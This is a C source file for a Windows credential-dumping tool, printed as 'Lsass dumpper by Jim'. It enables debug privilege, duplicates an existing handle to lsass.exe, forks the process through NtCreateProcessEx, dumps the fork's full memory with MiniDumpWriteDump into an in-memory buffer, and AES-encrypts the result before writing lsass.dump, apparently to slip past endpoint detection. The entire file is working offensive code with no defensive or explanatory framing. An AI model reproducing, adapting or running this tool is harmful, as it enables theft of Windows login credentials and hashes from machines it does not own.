#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdio.h>



#include "Structs.h"
#include "AES.h"

#pragma comment(lib, "Dbghelp.lib")


typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttribtues, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);

BOOL DuplicateLsassHandle(OUT HANDLE* phLsassProcess, IN DWORD dwLsassPid) {
	NTSTATUS				   STATUS					 = STATUS_SUCCESS;
	fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
	fnNtQueryObject			   pNtQueryObject			 = NULL;
	ULONG					   uArrayLength				 = 1024,
							   uReturnLength			 = NULL;

	PSYSTEM_HANDLE_INFORMATION pSysHandleInfo			 = NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInfo		 = NULL;
	HANDLE						hTmpProcessHandle		 = NULL,
								hDuplicatedProcessHandle = NULL;

	if (!phLsassProcess || !dwLsassPid)
		return FALSE;

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress [%d[ Failed With Error: %d\n ", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pNtQueryObject = (fnNtQueryObject)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryObject"))) {
		printf("[!] GetProcAddress [%d[ Failed With Error: %d\n ", __LINE__, GetLastError());
		goto _END_OF_FUNC;

	}

	if (!(pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, uArrayLength))){

		printf("[!] GetProcAddress [%d[ Failed With Error: %d\n ", __LINE__, GetLastError());
		goto _END_OF_FUNC;

	}

	while ((STATUS = pNtQuerySystemInformation(16, pSysHandleInfo, uArrayLength, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalReAlloc(pSysHandleInfo, uArrayLength *= 2, LMEM_MOVEABLE);

	for (ULONG i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {

		if (pSysHandleInfo->Handles[i].UniqueProcessId == dwLsassPid)
			continue;
		
		if (!(hTmpProcessHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pSysHandleInfo->Handles[i].UniqueProcessId)))
			continue;

		if (!DuplicateHandle(hTmpProcessHandle, pSysHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDuplicatedProcessHandle, (PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS), FALSE, NULL)) {
			CloseHandle(hTmpProcessHandle);
			continue;
		}

		if (!(pObjectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)LocalAlloc(LPTR, 1024))) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			continue;
		}

		if ((STATUS = pNtQueryObject(hDuplicatedProcessHandle, ObjectTypeInformation, pObjectTypeInfo, 1024, &uReturnLength)) != STATUS_SUCCESS) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		
		
		}

		if (wcscmp(L"Process", pObjectTypeInfo->TypeName.Buffer) != 0x00) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		
		}

		if (GetProcessId(hDuplicatedProcessHandle) != dwLsassPid) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;


		}

		*phLsassProcess = hDuplicatedProcessHandle;
		CloseHandle(hTmpProcessHandle);
		LocalFree(pObjectTypeInfo);
		break;
	}




_END_OF_FUNC:

	if (pSysHandleInfo)
		LocalFree(pSysHandleInfo);
	if (*phLsassProcess)
		return TRUE;
	printf("[!] No Open Handles to Lsass.exe was detected!\n");

	return FALSE;
}



typedef struct _MINIDUMP_CALLBACK_PARM {
	
	LPVOID pDumpedBuffer;
	DWORD  dwDumpedBufferSize;

}MINIDUMP_CALLBACK_PARM, * PMINIDUMP_CALLBACK_PARM;

BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {

	PMINIDUMP_CALLBACK_PARM pMiniDumpParam = (PMINIDUMP_CALLBACK_PARM)CallbackParam;
	LPVOID                  pSource = NULL,
							pDestination = NULL;
	DWORD				    dwBufferSize = 0x00;

	switch (CallbackInput->CallbackType) {

		case IoStartCallback: {
			CallbackOutput->Status = S_FALSE;
			break;
		}

		case IoWriteAllCallback: {
			CallbackOutput->Status = S_OK;

			pSource = CallbackInput->Io.Buffer;
			pDestination = (LPVOID)((DWORD_PTR)pMiniDumpParam->pDumpedBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
			dwBufferSize = CallbackInput->Io.BufferBytes;

			pMiniDumpParam->dwDumpedBufferSize += dwBufferSize;
			RtlCopyMemory(pDestination, pSource, dwBufferSize);

			break;
		}

		case IoFinishCallback: {

			CallbackOutput->Status = S_OK;
			break;

		}

		default: {

			return TRUE;
		}
	}

	return TRUE;
}


BOOL ForkRemoteProcess(IN OUT HANDLE* hpLsassHandle) {
	
	NTSTATUS STATUS = STATUS_SUCCESS;
	fnNtCreateProcessEx pNtCreateProcessEx = NULL;

	if (!(pNtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtCreateProcessEx"))) {
	
		printf("[!] NtCreateProcessEx [%d] failed with error: %d \n", __LINE__, GetLastError());
		return FALSE;
	
	}

	if ((STATUS = pNtCreateProcessEx(hpLsassHandle, (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), NULL, *hpLsassHandle, 0x00, NULL, NULL, NULL, 0x00)) != STATUS_SUCCESS) {
		printf("[!] NtCreateProcessEx failed with error: 0x%0.8X \n", STATUS);
		return FALSE;

	}

	return TRUE;


}


BOOL SetDebugPrivilege() {
	
	BOOL			 bResult = FALSE;
	TOKEN_PRIVILEGES TokenPrivs = { 0x00 };
	LUID			 Luid = { 0x00 };
	HANDLE           hCurrentTokenHandle = NULL;

	if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
		printf("[!] OpenProcessToken failed with error: %d\n", GetLastError());
		goto _END;
	
	}

	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
	
		printf("[!] LookupPrivilegeValueW failed with error: %d\n", GetLastError());
		goto _END;
	
	}

	TokenPrivs.PrivilegeCount = 0x01;
	TokenPrivs.Privileges[0].Luid = Luid;
	TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges failed with error: %d\n", GetLastError());
		goto _END;

	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[!] GetLastError failed with error: %d\n", GetLastError());
		goto _END;

	}

	bResult = TRUE;


_END:
	if (hCurrentTokenHandle)
		CloseHandle(hCurrentTokenHandle);
	return bResult;

}

#define NEW_NAME L"lsass.dump"

BOOL DumpLsassViaMiniDump(IN DWORD dwLsassProcessId) {

	BOOL						  bResult = FALSE;
	DWORD						  dwNumberOfbytesWritten = 0x00;
	HANDLE						  hLsassProcess = NULL,
								  hDumpFile = INVALID_HANDLE_VALUE;
	MINIDUMP_CALLBACK_INFORMATION MiniDumpInfo = { 0x00 };
	MINIDUMP_CALLBACK_PARM        MiniDumpParm = { 0x00 };


	PBYTE	pPlainText = NULL,
			pCipherText = NULL,
			pCipherTextWithConfig = NULL;
	SIZE_T	sPlainTextSize = NULL,
			sCipherTextSize = NULL;

	BYTE	pAesKey[KEY_SIZE] = { 0 };
	BYTE	pAesIv[IV_SIZE] = { 0 };



	RtlSecureZeroMemory(&MiniDumpInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	RtlSecureZeroMemory(&MiniDumpParm, sizeof(MINIDUMP_CALLBACK_PARM)); // dont forget

	if (!SetDebugPrivilege)
		return FALSE;

	printf("[!] Found an opened Lsass handle of PID: %d\n", dwLsassProcessId);

	if (!DuplicateLsassHandle(&hLsassProcess, dwLsassProcessId))
		goto _END;

	printf("[*] Opened An duplicated Lsass.exe Handle: 0x%0.8X \n", hLsassProcess);

	if (ForkRemoteProcess(&hLsassProcess))
		dwLsassProcessId = GetProcessId(hLsassProcess);
	else
		goto _END;

	printf("[+] Forked Lsass Process PID: %d\n", dwLsassProcessId);
	printf("[*] Opened An Forked Lsass.exe Handle: 0x%0.8X \n", hLsassProcess);

	if (!(MiniDumpParm.pDumpedBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75))) {
		printf("[!] HeapAlloc Failed with error: %d\n", GetLastError());
		goto _END;
	}

	MiniDumpInfo.CallbackRoutine = MinidumpCallbackRoutine;
	MiniDumpInfo.CallbackParam = &MiniDumpParm;

	if (!MiniDumpWriteDump(hLsassProcess, 0x00, 0x00, MiniDumpWithFullMemory, NULL, NULL, &MiniDumpInfo)) {
		printf("[!] MiniDumpWriteDump Failed with error: %d\n", GetLastError());
		goto _END;
	}

	printf("[!] MiniDumpWriteDump passed!\n");

	printf("[+] ReadPayloadFile DONE\n");

	if (!AesEncryptPayload(MiniDumpParm.pDumpedBuffer, MiniDumpParm.dwDumpedBufferSize, &pCipherText, &sCipherTextSize, pAesKey, pAesIv)) {
		return -1;
	}

	if (!(pCipherTextWithConfig = REALLOC(pCipherText, (sCipherTextSize + KEY_SIZE + IV_SIZE)))) {
		printf("[!] LocalReAlloc Failed With Error: %d \n", GetLastError());
		return -1;
	}

	memcpy((pCipherTextWithConfig + sCipherTextSize), pAesKey, KEY_SIZE);
	memcpy((pCipherTextWithConfig + (sCipherTextSize + KEY_SIZE)), pAesIv, IV_SIZE);

	printf("[i] Final Payload Size: %d\n", (sCipherTextSize + KEY_SIZE + IV_SIZE));

	printf("[i] Writing \"%s\" To The Disk ... ", NEW_NAME);

	if (!WritePayloadFile(pCipherTextWithConfig, (sCipherTextSize + KEY_SIZE + IV_SIZE))) {
		return -1;
	}

	printf("[+] DONE \n");
	printf("[*] Lsass is dumpped Successfully !\n");
	FREE(pCipherTextWithConfig);

	return 0;




_END:
	if (hLsassProcess)
		CloseHandle(hLsassProcess);
	if(hDumpFile)
		CloseHandle(hDumpFile);
	if (MiniDumpParm.pDumpedBuffer)
		HeapFree(GetProcessHeap(), 0x00, MiniDumpParm.pDumpedBuffer);

	
	return 0;
}




BOOL GetProcessIDViaSnapShot(IN LPWSTR szProcessName, OUT PDWORD pdwProcessID, OUT OPTIONAL PHANDLE phProcess) {

	PROCESSENTRY32 ProcEntry = { .dwSize = sizeof(PROCESSENTRY32) };
	WCHAR		   wcUpperCaseProcName[MAX_PATH] = { 0x00 };
	HANDLE		   hSnapShot = INVALID_HANDLE_VALUE;

	if (!szProcessName || !pdwProcessID || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++) {
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];

	}

	if ((hSnapShot = CreateToolhelp32Snapshot
	(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		////PRINT("[!] CreateToolhelp32Snapshot failed with error : %d\n", GetLastError());
		return FALSE;
	}

	if (!Process32First(hSnapShot, &ProcEntry)) {
		////PRINT("[!] Process32First failed with error : %d\n", GetLastError());
		goto _END;
	}

	do {
		WCHAR szUprProcName[MAX_PATH] = { 0x00 };

		if (ProcEntry.szExeFile && lstrlenW(ProcEntry.szExeFile) < MAX_PATH) {

			RtlSecureZeroMemory(szUprProcName, sizeof(szUprProcName));

			for (int i = 0; i < lstrlenW(ProcEntry.szExeFile); i++) {

				if (ProcEntry.szExeFile[i] >= 'a' && ProcEntry.szExeFile[i] <= 'z')
					szUprProcName[i] = ProcEntry.szExeFile[i] - 'a' + 'A';
				else
					szUprProcName[i] = ProcEntry.szExeFile[i];
			}
		}

		if (wcscmp(szUprProcName, wcUpperCaseProcName) == 0x00) {
			if (phProcess)
				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry.th32ProcessID);
			*pdwProcessID = ProcEntry.th32ProcessID;

			break;
		}

	} while (Process32Next(hSnapShot, &ProcEntry));
_END:
	if (hSnapShot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapShot);
	return (*pdwProcessID) ? TRUE : FALSE;


}

#define TARGET_PROCESS_NAME				L"lsass.exe"

int main() {

	//BOOL bResult = FALSE;
	
	
	HANDLE hProcess = NULL;
	DWORD dwProcessId = 0x00;

	//if (dwProcessId == INVALID_HANDLE_VALUE) {
	//	printf("Must supply a processid");
	//	return 0;
	//}
	printf("============ Lsass dumpper by Jim ============ \n");


	if (!GetProcessIDViaSnapShot(TARGET_PROCESS_NAME, &dwProcessId, &hProcess)) {
		printf("Error GetProcessIDViaSnapShot: %d\n", GetLastError());
		return 0;
	}

	DWORD dwProcessId_lsass = dwProcessId;
	
	/*if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId)) == NULL) {
		printf("[!] OpenProcess Failed with error: %d\n", GetLastError());
		goto _end;
	}*/

	DumpLsassViaMiniDump(dwProcessId_lsass);

	return 0;
//
//_end:
//	if (hProcess)
//		CloseHandle(hProcess);
//	return bResult;


}

